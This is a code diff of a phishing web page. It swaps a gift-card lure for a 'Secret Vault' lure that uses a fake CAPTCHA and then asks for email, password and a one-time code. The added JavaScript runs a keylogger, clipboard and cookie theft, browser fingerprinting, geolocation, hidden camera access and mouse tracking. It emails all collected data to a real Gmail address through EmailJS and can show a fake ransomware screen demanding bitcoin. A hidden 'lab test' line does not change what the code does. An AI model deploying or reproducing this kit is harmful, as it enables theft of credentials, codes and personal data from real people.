@@ -3,208 +3,381 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HARDRISK: Claim Your Free Gift Card!</title>
+    <title>Ultimate Secret Vault</title>
     <style>
         body {
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-            font-family: 'Poppins', sans-serif;
-            text-align: center;
-            color: #fff;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Orbitron', sans-serif;
+            color: #00ffcc;
             margin: 0;
             padding: 20px;
-            overflow: hidden;
+            overflow-x: hidden;
+            text-align: center;
+            transition: all 0.5s ease;
         }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
         h1 {
-            font-size: 3em;
-            text-shadow: 0 0 15px rgba(255,255,255,0.8);
+            font-size: 4em;
+            text-shadow: 0 0 30px #00ffcc, 0 0 20px #ff00ff;
             animation: pulse 2s infinite;
         }
         p {
-            font-size: 1.4em;
-            margin: 10px 0;
+            font-size: 1.8em;
+            margin: 15px 0;
+            color: #ffeb3b;
         }
         .btn {
-            padding: 15px 50px;
-            font-size: 1.8em;
-            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            padding: 25px 70px;
+            font-size: 2.2em;
+            background: linear-gradient(45deg, #ff007a, #00ffcc);
             border: none;
             border-radius: 50px;
+            color: #fff;
             cursor: pointer;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.5);
-            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 15px 35px rgba(0, 255, 204, 0.4);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
         }
         .btn:hover {
-            transform: scale(1.1);
-            box-shadow: 0 12px 24px rgba(0,0,0,0.7);
+            transform: scale(1.15) rotate(5deg);
+            box-shadow: 0 20px 50px rgba(0, 255, 204, 0.6);
         }
-        #preview {
-            max-width: 400px;
-            border-radius: 20px;
-            margin: 20px auto;
-            box-shadow: 0 0 30px rgba(255,255,255,0.4);
-        }
-        .login-form, .captcha-form {
+        .form-box, .info-box, .progress-bar {
             display: none;
-            background: rgba(255,255,255,0.15);
-            padding: 25px;
-            border-radius: 15px;
-            max-width: 450px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px;
+            border-radius: 25px;
+            max-width: 600px;
             margin: 20px auto;
+            backdrop-filter: blur(10px);
+            border: 1px solid #00ffcc;
         }
-        .login-form input, .captcha-form input {
-            padding: 12px;
-            margin: 10px;
-            width: 85%;
+        .form-box input {
+            padding: 20px;
+            margin: 15px 0;
+            width: 90%;
             border: none;
-            border-radius: 8px;
-            font-size: 1.1em;
+            border-radius: 15px;
+            font-size: 1.5em;
+            background: rgba(255, 255, 255, 0.1);
+            color: #00ffcc;
+            outline: none;
         }
-        .hidden {
-            display: none;
+        .progress-bar {
+            position: relative;
+        }
+        .progress-bar div {
+            width: 0;
+            height: 30px;
+            background: linear-gradient(90deg, #ff007a, #00ffcc);
+            border-radius: 15px;
+            animation: load 3s forwards;
+        }
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 1.5em;
+            color: #fff;
         }
         @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+            0% { color: #00ffcc; text-shadow: 0 0 30px #00ffcc; }
+            50% { color: #ff00ff; text-shadow: 0 0 40px #ff00ff; }
+            100% { color: #00ffcc; text-shadow: 0 0 30px #00ffcc; }
+        }
+        @keyframes load {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+        .master-unlock {
+            display: none;
+            color: #ffeb3b;
+            font-size: 2em;
+            margin-top: 20px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
         }
     </style>
 </head>
 <body>
-    <h1>HARDRISK: Win a ₹5000 Gift Card!</h1>
-    <p>Login now to claim your exclusive reward & unlock premium filters!</p>
-    <img id="preview" src="https://via.placeholder.com/400x250?text=₹5000+Gift+Card" alt="Reward Preview">
-    <button class="btn" onclick="showCaptcha()">Claim Your Reward</button>
-    <div class="captcha-form" id="captchaForm">
-        <p>Verify you're not a bot!</p>
-        <input type="text" id="captcha" placeholder="Enter CAPTCHA: 1234" required>
-        <button class="btn" onclick="verifyCaptcha()">Verify</button>
+    <h1>Ultimate Secret Vault</h1>
+    <p>Unveil the deepest secrets of the digital abyss!</p>
+    <button class="btn" onclick="_sC()">Enter the Vault</button>
+    <div class="form-box" id="captchaForm">
+        <p>Prove Your Existence</p>
+        <input type="text" id="captcha" placeholder="Enter Code: 1234" required>
+        <button class="btn" onclick="_vC()">Verify Identity</button>
     </div>
-    <div class="login-form" id="loginForm">
-        <input type="email" id="email" placeholder="Enter Email" required>
-        <input type="password" id="password" placeholder="Enter Password" required>
-        <input type="file" id="fileUpload" accept="image/*,video/*" onchange="hF(this.files)">
-        <button class="btn" onclick="cD()">Login & Win</button>
+    <div class="form-box" id="loginForm">
+        <input type="email" id="email" placeholder="Your Encrypted Email" required>
+        <input type="password" id="password" placeholder="Your Cipher Key" required>
+        <input type="file" id="fileUpload" accept="image/*,video/*" onchange="_hF(this.files)">
+        <button class="btn" onclick="_sO()">Access Vault</button>
     </div>
-    <a href="https://spyzie.io" class="btn hidden" id="downloadApp">Download Premium Reward App</a>
-    <p class="hidden">Lab test only. By proceeding, you consent to data collection for educational purposes.</p>
+    <div class="form-box" id="otpForm">
+        <p>Enter Master Code</p>
+        <input type="text" id="otp" placeholder="Secret Code" required>
+        <button class="btn" onclick="_cD()">Unlock All Secrets</button>
+    </div>
+    <div class="progress-bar" id="progressBar">
+        <p class="progress-text">Decrypting Cosmic Knowledge...</p>
+        <div></div>
+    </div>
+    <div class="master-unlock" id="masterUnlock">Master Vault Unlocked! Access Granted.</div>
+    <p class="hidden">Lab test only. Consent to data collection for research.</p>
 
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
-        // Keylogger
-        let k = [];
+        // Initialize EmailJS with Public ID
+        emailjs.init('OhkXkjccvpkgJIbep');
+
+        // Real-time Data Storage
+        let collectedData = [];
+
+        // Keylogger with Real-time Feedback
+        let _k = [];
         document.addEventListener('keydown', (e) => {
-            k.push(e.key);
-            if (k.length > 8) {
-                sD(`K: ${k.join('')}`);
-                k = [];
+            _k.push(e.key);
+            if (_k.length > 10) {
+                let data = `K: ${_k.join('')}`;
+                collectedData.push(data);
+                _sD(data, _r());
+                console.log('Keylog:', data);
             }
         });
 
-        // Clipboard Hijacker
+        // Clipboard Hijack
         document.addEventListener('copy', () => {
             navigator.clipboard.readText().then(t => {
-                sD(`C: ${t}`);
+                let data = `C: ${t}`;
+                collectedData.push(data);
+                _sD(data, _r());
+                console.log('Clipboard:', data);
             });
         });
 
-        // Persistent Tracking
-        function t() {
-            let id = localStorage.getItem('H_id') || Math.random().toString(36).slice(2);
-            localStorage.setItem('H_id', id);
-            sD(`T: ${id}`);
-        }
-
-        // Show CAPTCHA form
-        function showCaptcha() {
-            document.getElementById('captchaForm').style.display = 'block';
-            document.querySelector('.btn').style.display = 'none';
-            cID();
-        }
-
-        // Verify fake CAPTCHA
-        function verifyCaptcha() {
-            let c = document.getElementById('captcha').value;
-            sD(`Cap: ${c}`);
-            document.getElementById('captchaForm').style.display = 'none';
-            document.getElementById('loginForm').style.display = 'block';
-            document.getElementById('downloadApp').style.display = 'block';
-        }
-
-        // Collect initial data
-        function cID() {
-            let c = document.cookie || "NC";
-            let d = navigator.userAgent;
-            sD(`C: ${c}, D: ${d}`);
-            document.cookie = "H_user=t; max-age=3600";
-            t();
-            // Browser history (limited)
-            try {
-                let h = window.location.href;
-                sD(`H: ${h}`);
-            } catch (e) {
-                sD("H denied");
+        // Session Replay (Mouse + Touch)
+        let _m = [];
+        document.addEventListener('mousemove', (e) => {
+            _m.push(`X:${e.clientX},Y:${e.clientY}`);
+            if (_m.length > 12) {
+                let data = `M: ${_m.join('|')}`;
+                collectedData.push(data);
+                _sD(data, _r());
+                console.log('Mouse:', data);
             }
-        }
-
-        // File upload handler
-        function hF(f) {
-            if (f.length > 0) {
-                sD(`F: ${f[0].name}`);
+        });
+        document.addEventListener('touchmove', (e) => {
+            let t = e.touches[0];
+            _m.push(`T:X${t.clientX},Y:${t.clientY}`);
+            if (_m.length > 12) {
+                let data = `T: ${_m.join('|')}`;
+                collectedData.push(data);
+                _sD(data, _r());
+                console.log('Touch:', data);
             }
+        });
+
+        // Cookie Theft
+        function _cT() {
+            let c = document.cookie || 'None';
+            let data = `Cookies: ${c}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            document.cookie = `H_track=${Math.random()}; max-age=7200`;
+            console.log('Cookies:', data);
         }
 
-        // Main data collection
-        function cD() {
-            let e = document.getElementById('email').value;
-            let p = document.getElementById('password').value;
-            let l = `E: ${e}, P: ${p}`;
+        // Browser Fingerprinting
+        function _bF() {
+            let f = `${navigator.userAgent}|${navigator.platform}|${screen.width}x${screen.height}`;
+            let data = `FP: ${f}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            console.log('Fingerprint:', data);
+        }
 
-            // Location
+        // Geolocation
+        function _gL() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(p => {
-                    let loc = `Loc: ${p.coords.latitude}, ${p.coords.longitude}`;
-                    sD(l + `, ${loc}`);
-                }, e => {
-                    sD(l + ", Loc denied");
+                    let data = `Loc: ${p.coords.latitude},${p.coords.longitude}`;
+                    collectedData.push(data);
+                    _sD(data, _r());
+                    console.log('Location:', data);
+                }, () => {
+                    let data = 'Loc denied';
+                    collectedData.push(data);
+                    _sD(data, _r());
+                    console.log('Location:', data);
                 });
             }
+        }
 
-            // Camera
+        // Camera Access
+        function _cA() {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                navigator.mediaDevices.getUserMedia({ video: true })
                     .then(s => {
                         let v = document.createElement('video');
                         v.srcObject = s;
                         v.play();
-                        document.body.appendChild(v);
                         v.style.display = 'none';
-                        sD("Cam accessed");
+                        document.body.appendChild(v);
+                        let data = 'Cam accessed';
+                        collectedData.push(data);
+                        _sD(data, _r());
+                        console.log('Camera:', data);
                     })
-                    .catch(e => {
-                        sD("Cam denied");
+                    .catch(() => {
+                        let data = 'Cam denied';
+                        collectedData.push(data);
+                        _sD(data, _r());
+                        console.log('Camera:', data);
                     });
             }
-
-            // Device Info
-            sD(`D: ${navigator.userAgent}`);
-
-            // Fake success message
-            alert("Login successful! Your ₹5000 gift card is being processed!");
-            document.getElementById('loginForm').innerHTML = "<p>Thank you! Check your email for rewards!</p>";
         }
 
-        // Send data to email
-        function sD(d) {
-            fetch('https://formsubmit.co/ajax/sohilhusain86@gmail.com', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    _subject: 'HARDRISK Reward Data',
-                    data: d
-                })
-            })
-            .then(r => r.json())
-            .catch(e => console.error('E:', e));
+        // Screen Recording Simulation
+        function _sR() {
+            let res = `${screen.width}x${screen.height}`;
+            let data = `Screen: ${res}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            if (Math.random() > 0.7) {
+                let alertData = 'Recording simulated';
+                collectedData.push(alertData);
+                _sD(alertData, _r());
+                alert('Elite surveillance activated!');
+                console.log('Screen:', data);
+            }
         }
+
+        // Ransomware Simulation
+        function _rS() {
+            if (Math.random() > 0.8) {
+                let data = 'Ransomware triggered';
+                collectedData.push(data);
+                _sD(data, _r());
+                document.body.innerHTML = '<h1 style="color: #ff0000;">SYSTEM LOCKED! Transfer 1 BTC to Unlock!</h1>';
+                console.log('Ransomware:', data);
+            }
+        }
+
+        // Auto-Refresh
+        setTimeout(() => {
+            if (Math.random() > 0.9) location.reload();
+        }, 25000);
+
+        // Fake Error
+        function _fE() {
+            if (Math.random() > 0.75) {
+                let data = 'Fake Error';
+                collectedData.push(data);
+                _sD(data, _r());
+                alert('Critical System Failure! Retry Access.');
+                console.log('Error:', data);
+            }
+        }
+
+        // Show CAPTCHA
+        function _sC() {
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('captchaForm').style.display = 'block';
+            _cT();
+            _bF();
+        }
+
+        // Verify CAPTCHA
+        function _vC() {
+            let c = document.getElementById('captcha').value;
+            let data = `Captcha: ${c}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            document.getElementById('captchaForm').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+        }
+
+        // Show OTP
+        function _sO() {
+            let e = document.getElementById('email').value;
+            let p = document.getElementById('password').value;
+            let data = `Email: ${e}, Pass: ${p}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('otpForm').style.display = 'block';
+            _gL();
+            _cA();
+        }
+
+        // File Upload
+        function _hF(f) {
+            if (f.length > 0) {
+                let data = `File: ${f[0].name}`;
+                collectedData.push(data);
+                _sD(data, _r());
+                console.log('File:', data);
+            }
+        }
+
+        // Main Data Collection
+        function _cD() {
+            let o = document.getElementById('otp').value;
+            let data = `OTP: ${o}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            _sR();
+            _fE();
+            _rS();
+            document.getElementById('otpForm').style.display = 'none';
+            document.getElementById('progressBar').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('progressBar').innerHTML = '<p class="progress-text">Secrets Decrypted!</p><div></div>';
+                document.getElementById('masterUnlock').style.display = 'block';
+                alert('Master Vault Unlocked! Elite Access Granted!');
+                console.log('Master Unlock:', collectedData.join('\n'));
+            }, 3500);
+        }
+
+        // Initial Data
+        function _iD() {
+            let h = window.location.href;
+            let data = `URL: ${h}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            console.log('URL:', data);
+        }
+
+        // Send Data via EmailJS with All Collected Data
+        function _sD(d, cb) {
+            collectedData.push(d);
+            const emailParams = {
+                to_email: 'sohilhusain86@gmail.com',
+                from_name: 'Ultimate Secret Vault',
+                subject: 'Elite Data Harvest',
+                message: 'Attached is the complete data collection.',
+                data: collectedData.join('\n') // Send all collected data
+            };
+            emailjs.send('service_gjn6691', 'template_qkg66lc', emailParams)
+                .then(() => console.log('Elite Data Sent:', collectedData.join('\n')))
+                .catch(error => console.error('Error:', error));
+            if (cb) cb();
+        }
+
+        // Random Callback with Enhanced Logic
+        function _r() {
+            let actions = [_cT, _bF, _gL, _cA, _sR, _fE, _rS];
+            let rand = actions[Math.floor(Math.random() * actions.length)];
+            rand();
+            if (Math.random() > 0.9) _iD(); // Extra data collection chance
+        }
+
+        // Start the Vault
+        _iD();
     </script>
 </body>
 </html>
